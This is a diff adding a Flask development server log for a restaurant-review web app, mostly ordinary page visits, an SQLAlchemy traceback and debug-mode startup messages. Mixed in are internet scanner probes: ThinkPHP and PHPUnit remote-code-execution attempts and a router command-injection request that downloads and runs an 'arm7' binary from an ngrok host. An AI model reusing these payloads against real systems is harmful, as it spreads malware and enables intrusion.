+192.35.168.219 - - [06/Aug/2020 13:59:37] "[37mGET / HTTP/1.1[0m" 200 -
+192.35.168.219 - - [06/Aug/2020 13:59:37] "[37mGET / HTTP/1.1[0m" 200 -
+195.54.160.21 - - [06/Aug/2020 14:07:39] "[37mGET /?XDEBUG_SESSION_START=phpstorm HTTP/1.1[0m" 200 -
+195.54.160.21 - - [06/Aug/2020 14:27:09] "[37mGET /?a=fetch&content=<php>die(@md5(HelloThinkCMF))</php> HTTP/1.1[0m" 200 -
+195.54.160.21 - - [06/Aug/2020 14:34:31] "[33mGET /index.php?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=HelloThinkPHP HTTP/1.1[0m" 404 -
+118.241.71.40 - - [06/Aug/2020 14:36:11] "[37mGET /user/matsuoka HTTP/1.1[0m" 200 -
+118.241.71.40 - - [06/Aug/2020 14:36:21] "[37mGET / HTTP/1.1[0m" 200 -
+118.241.71.40 - - [06/Aug/2020 14:36:31] "[37mGET / HTTP/1.1[0m" 200 -
+118.241.71.40 - - [06/Aug/2020 14:36:33] "[37mGET /user/mizutani HTTP/1.1[0m" 200 -
+118.241.71.40 - - [06/Aug/2020 14:36:35] "[37mGET / HTTP/1.1[0m" 200 -
+118.241.71.40 - - [06/Aug/2020 14:36:36] "[37mGET /user/mizutani HTTP/1.1[0m" 200 -
+118.241.71.40 - - [06/Aug/2020 14:36:47] "[37mGET /user/ HTTP/1.1[0m" 200 -
+118.241.71.40 - - [06/Aug/2020 14:36:59] "[37mGET /user/mizutani HTTP/1.1[0m" 200 -
+118.241.71.40 - - [06/Aug/2020 14:37:06] "[37mGET / HTTP/1.1[0m" 200 -
+164.70.183.224 - - [06/Aug/2020 14:38:21] "[37mGET /restaurant/2 HTTP/1.1[0m" 200 -
+164.70.183.224 - - [06/Aug/2020 14:38:22] "[37mGET /restaurant/2 HTTP/1.1[0m" 200 -
+113.246.137.239 - - [06/Aug/2020 15:12:50] "[33mPOST /GponForm/diag_Form?images/ HTTP/1.1[0m" 404 -
+118.241.71.40 - - [06/Aug/2020 15:17:13] "[37mGET / HTTP/1.1[0m" 200 -
+118.241.71.40 - - [06/Aug/2020 15:23:36] "[37mGET /restaurant/2 HTTP/1.1[0m" 200 -
+118.241.71.40 - - [06/Aug/2020 15:24:41] "[37mGET / HTTP/1.1[0m" 200 -
+118.241.71.40 - - [06/Aug/2020 15:25:13] "[37mGET /user/matsuoka HTTP/1.1[0m" 200 -
+118.241.71.40 - - [06/Aug/2020 15:26:40] "[37mGET / HTTP/1.1[0m" 200 -
+118.241.71.40 - - [06/Aug/2020 15:26:46] "[37mGET / HTTP/1.1[0m" 200 -
+118.241.71.40 - - [06/Aug/2020 15:26:49] "[37mGET /logout/ HTTP/1.1[0m" 200 -
+118.241.71.40 - - [06/Aug/2020 15:26:52] "[37mGET /signup/ HTTP/1.1[0m" 200 -
+118.241.71.40 - - [06/Aug/2020 15:27:02] "[37mPOST /signup/ HTTP/1.1[0m" 200 -
+118.241.71.40 - - [06/Aug/2020 15:27:08] "[37mGET / HTTP/1.1[0m" 200 -
+118.241.71.40 - - [06/Aug/2020 15:27:09] "[37mGET /user/ HTTP/1.1[0m" 200 -
+118.241.71.40 - - [06/Aug/2020 15:27:12] "[37mGET /user/mizutani HTTP/1.1[0m" 200 -
+118.241.71.40 - - [06/Aug/2020 15:27:14] "[37mPOST /follow/ HTTP/1.1[0m" 200 -
+118.241.71.40 - - [06/Aug/2020 15:27:18] "[37mGET / HTTP/1.1[0m" 200 -
+118.241.71.40 - - [06/Aug/2020 15:27:35] "[37mGET /restaurant/1 HTTP/1.1[0m" 200 -
+118.241.71.40 - - [06/Aug/2020 15:28:43] "[37mGET /restaurant/ HTTP/1.1[0m" 200 -
+118.241.71.40 - - [06/Aug/2020 15:28:48] "[37mGET / HTTP/1.1[0m" 200 -
+118.241.71.40 - - [06/Aug/2020 15:28:50] "[37mGET /user/isokawa HTTP/1.1[0m" 200 -
+118.241.71.40 - - [06/Aug/2020 15:29:00] "[37mGET /restaurant/ HTTP/1.1[0m" 200 -
+118.241.71.40 - - [06/Aug/2020 15:29:02] "[37mGET /restaurant/1 HTTP/1.1[0m" 200 -
+118.241.71.40 - - [06/Aug/2020 15:29:27] "[37mPOST /report/ HTTP/1.1[0m" 200 -
+118.241.71.40 - - [06/Aug/2020 15:29:36] "[37mGET /user/isokawa HTTP/1.1[0m" 200 -
+118.241.71.40 - - [06/Aug/2020 15:29:39] "[37mGET /report/edit/?id=39 HTTP/1.1[0m" 200 -
+118.241.71.40 - - [06/Aug/2020 15:29:44] "[37mPOST /report/edit/ HTTP/1.1[0m" 200 -
+118.241.71.40 - - [06/Aug/2020 15:29:47] "[37mGET /restaurant/1 HTTP/1.1[0m" 200 -
+103.199.114.113 - - [06/Aug/2020 15:56:59] "[37mGET / HTTP/1.1[0m" 200 -
+103.196.36.41 - - [06/Aug/2020 16:00:03] "[37mGET / HTTP/1.1[0m" 200 -
+113.31.115.156 - - [06/Aug/2020 16:34:59] "[37mGET / HTTP/1.1[0m" 200 -
+113.31.115.156 - - [06/Aug/2020 16:35:00] "[37mGET / HTTP/1.1[0m" 200 -
+ * Detected change in '/home/dbuser/dblec_app/api/models/restaurant.py', reloading
+1
+5
+6
+7
+9
+2
+1
+2
+1
+ * Restarting with stat
+Traceback (most recent call last):
+  File "/home/dbuser/dblec_app/app.py", line 1, in <module>
+    from api import app
+  File "/home/dbuser/dblec_app/api/__init__.py", line 2, in <module>
+    from .views.user import user_router
+  File "/home/dbuser/dblec_app/api/views/user.py", line 5, in <module>
+    from api.models.report import Report, ReportSchema, ReportJoinSchema
+  File "/home/dbuser/dblec_app/api/models/report.py", line 7, in <module>
+    from .restaurant import Restaurant
+  File "/home/dbuser/dblec_app/api/models/restaurant.py", line 4, in <module>
+    class Restaurant(db.Model):
+  File "/home/dbuser/dblec_app/api/models/restaurant.py", line 10, in Restaurant
+    location = db.Column(db.Point)
+AttributeError: 'SQLAlchemy' object has no attribute 'Point'
+ * Serving Flask app "api" (lazy loading)
+ * Environment: production
+   WARNING: This is a development server. Do not use it in a production deployment.
+   Use a production WSGI server instead.
+ * Debug mode: on
+/usr/local/lib/python3.6/site-packages/flask_sqlalchemy/__init__.py:834: FSADeprecationWarning: SQLALCHEMY_TRACK_MODIFICATIONS adds significant overhead and will be disabled by default in the future.  Set it to True or False to suppress this warning.
+  'SQLALCHEMY_TRACK_MODIFICATIONS adds significant overhead and '
+ * Running on http://0.0.0.0:80/ (Press CTRL+C to quit)
+ * Restarting with stat
+/usr/local/lib/python3.6/site-packages/flask_sqlalchemy/__init__.py:834: FSADeprecationWarning: SQLALCHEMY_TRACK_MODIFICATIONS adds significant overhead and will be disabled by default in the future.  Set it to True or False to suppress this warning.
+  'SQLALCHEMY_TRACK_MODIFICATIONS adds significant overhead and '
+ * Debugger is active!
+ * Debugger PIN: 324-991-647
+118.241.71.40 - - [06/Aug/2020 22:20:28] "[37mGET /restaurant/1 HTTP/1.1[0m" 200 -
+118.241.71.40 - - [06/Aug/2020 22:20:41] "[37mGET /restaurant/1 HTTP/1.1[0m" 200 -
+118.241.71.40 - - [06/Aug/2020 22:20:44] "[37mGET /restaurant/5 HTTP/1.1[0m" 200 -
+118.241.71.40 - - [06/Aug/2020 22:43:32] "[37mGET / HTTP/1.1[0m" 200 -
+118.241.71.40 - - [06/Aug/2020 22:43:34] "[37mGET /logout/ HTTP/1.1[0m" 200 -
+118.241.71.40 - - [06/Aug/2020 22:43:48] "[37mGET / HTTP/1.1[0m" 200 -
+118.241.71.40 - - [06/Aug/2020 22:47:39] "[37mGET /signup/ HTTP/1.1[0m" 200 -
+118.241.71.40 - - [06/Aug/2020 22:47:51] "[37mGET /login/ HTTP/1.1[0m" 200 -
+118.241.71.40 - - [06/Aug/2020 22:47:59] "[37mPOST /login/ HTTP/1.1[0m" 200 -
+118.241.71.40 - - [06/Aug/2020 22:52:29] "[37mGET / HTTP/1.1[0m" 200 -
+118.241.71.40 - - [06/Aug/2020 22:52:31] "[37mGET /user/isokawa HTTP/1.1[0m" 200 -
+118.241.71.40 - - [06/Aug/2020 22:52:33] "[37mGET /user/isokawa/following HTTP/1.1[0m" 200 -
+118.241.71.40 - - [06/Aug/2020 22:52:34] "[37mGET /user/mizutani HTTP/1.1[0m" 200 -
+162.243.128.109 - - [06/Aug/2020 23:01:59] "[33mGET /ReportServer HTTP/1.1[0m" 404 -
+195.54.160.21 - - [06/Aug/2020 23:07:57] "[33mPOST /api/jsonws/invoke HTTP/1.1[0m" 404 -
+164.70.183.224 - - [07/Aug/2020 00:17:59] "[37mGET / HTTP/1.1[0m" 200 -
+164.70.183.224 - - [07/Aug/2020 00:17:59] "[33mGET /favicon.ico HTTP/1.1[0m" 404 -
+164.70.183.224 - - [07/Aug/2020 00:18:01] "[37mGET /restaurant/2 HTTP/1.1[0m" 200 -
+164.70.183.224 - - [07/Aug/2020 00:18:14] "[37mGET /user/matsuoka HTTP/1.1[0m" 200 -
+164.70.183.224 - - [07/Aug/2020 00:18:18] "[37mGET /user/matsuoka HTTP/1.1[0m" 200 -
+164.70.183.224 - - [07/Aug/2020 00:18:24] "[37mGET /restaurant/9 HTTP/1.1[0m" 200 -
+164.70.183.224 - - [07/Aug/2020 00:18:32] "[37mGET /restaurant/7 HTTP/1.1[0m" 200 -
+164.70.183.224 - - [07/Aug/2020 00:18:38] "[37mGET /restaurant/6 HTTP/1.1[0m" 200 -
+164.70.183.224 - - [07/Aug/2020 00:18:45] "[37mGET /restaurant/5 HTTP/1.1[0m" 200 -
+164.70.183.224 - - [07/Aug/2020 00:18:51] "[37mGET /restaurant/1 HTTP/1.1[0m" 200 -
+164.70.183.224 - - [07/Aug/2020 00:18:57] "[37mGET /restaurant/4 HTTP/1.1[0m" 200 -
+164.70.183.224 - - [07/Aug/2020 00:19:09] "[37mGET /restaurant/ HTTP/1.1[0m" 200 -
+164.70.183.224 - - [07/Aug/2020 00:19:13] "[37mGET /restaurant/15 HTTP/1.1[0m" 200 -
+164.70.183.224 - - [07/Aug/2020 00:19:29] "[37mGET /restaurant/ HTTP/1.1[0m" 200 -
+164.70.183.224 - - [07/Aug/2020 00:19:32] "[37mGET /restaurant/11 HTTP/1.1[0m" 200 -
+164.70.183.224 - - [07/Aug/2020 00:21:39] "[37mGET /restaurant/ HTTP/1.1[0m" 200 -
+164.70.183.224 - - [07/Aug/2020 00:21:41] "[37mGET /restaurant/2 HTTP/1.1[0m" 200 -
+45.125.65.86 - - [07/Aug/2020 00:45:30] "[33mGET /vicidial/admin.php?ADD=140000000000 HTTP/1.1[0m" 404 -
+195.54.160.21 - - [07/Aug/2020 01:11:08] "[33mGET /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1[0m" 404 -
+139.162.106.181 - - [07/Aug/2020 01:12:05] "[37mGET / HTTP/1.1[0m" 200 -
+195.54.160.21 - - [07/Aug/2020 01:42:25] "[33mPOST /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1[0m" 404 -
+35.180.66.93 - - [07/Aug/2020 02:12:47] "[33mGET /.git/HEAD HTTP/1.1[0m" 404 -
+181.48.164.98 - - [07/Aug/2020 03:24:15] "[33mPOST /cgi-bin/mainfunction.cgi?action=login&keyPath=%27%0A/bin/sh${IFS}-c${IFS}'cd${IFS}/tmp;${IFS}rm${IFS}-rf${IFS}arm7;${IFS}busybox${IFS}wget${IFS}http://19ce033f.ngrok.io/arm7;${IFS}chmod${IFS}777${IFS}arm7;${IFS}./arm7'%0A%27&loginUser=a&loginPwd=a HTTP/1.1[0m" 404 -
+193.118.55.146 - - [07/Aug/2020 05:30:15] "[37mGET / HTTP/1.1[0m" 200 -
+80.82.78.85 - - [07/Aug/2020 06:00:49] "[37mGET / HTTP/1.1[0m" 200 -
+103.98.33.184 - - [07/Aug/2020 06:41:00] "[37mGET / HTTP/1.1[0m" 200 -
+78.187.196.232 - - [07/Aug/2020 06:57:22] "[37mGET / HTTP/1.0[0m" 200 -
+162.243.129.121 - - [07/Aug/2020 07:15:19] "[33mGET /hudson HTTP/1.1[0m" 404 -
+192.35.168.200 - - [07/Aug/2020 07:31:06] "[37mGET / HTTP/1.1[0m" 200 -
+192.35.168.200 - - [07/Aug/2020 07:31:06] "[37mGET / HTTP/1.1[0m" 200 -
+92.118.160.53 - - [07/Aug/2020 07:53:11] "[37mGET / HTTP/1.1[0m" 200 -
+180.149.125.166 - - [07/Aug/2020 09:35:30] "[37mGET / HTTP/1.1[0m" 200 -
+125.86.182.74 - - [07/Aug/2020 09:48:19] "[33mGET /TP/public/index.php HTTP/1.1[0m" 404 -
+125.86.182.74 - - [07/Aug/2020 09:48:19] "[33mGET /TP/index.php HTTP/1.1[0m" 404 -
+125.86.182.74 - - [07/Aug/2020 09:48:20] "[33mGET /thinkphp/html/public/index.php HTTP/1.1[0m" 404 -
+125.86.182.74 - - [07/Aug/2020 09:48:20] "[33mGET /html/public/index.php HTTP/1.1[0m" 404 -
+125.86.182.74 - - [07/Aug/2020 09:48:20] "[33mGET /public/index.php HTTP/1.1[0m" 404 -
+125.86.182.74 - - [07/Aug/2020 09:48:20] "[33mGET /TP/html/public/index.php HTTP/1.1[0m" 404 -
+125.86.182.74 - - [07/Aug/2020 09:48:22] "[33mGET /elrekt.php HTTP/1.1[0m" 404 -
+125.86.182.74 - - [07/Aug/2020 09:48:22] "[33mGET /index.php HTTP/1.1[0m" 404 -
+125.86.182.74 - - [07/Aug/2020 09:48:22] "[37mGET / HTTP/1.1[0m" 200 -
+37.49.224.168 - - [07/Aug/2020 09:56:17] "[37mGET / HTTP/1.1[0m" 200 -
+118.241.71.40 - - [07/Aug/2020 10:38:20] "[37mGET /user/mizutani HTTP/1.1[0m" 200 -
+118.241.71.40 - - [07/Aug/2020 10:38:21] "[33mGET /favicon.ico HTTP/1.1[0m" 404 -
+118.241.71.40 - - [07/Aug/2020 10:38:27] "[37mGET /restaurant/5 HTTP/1.1[0m" 200 -
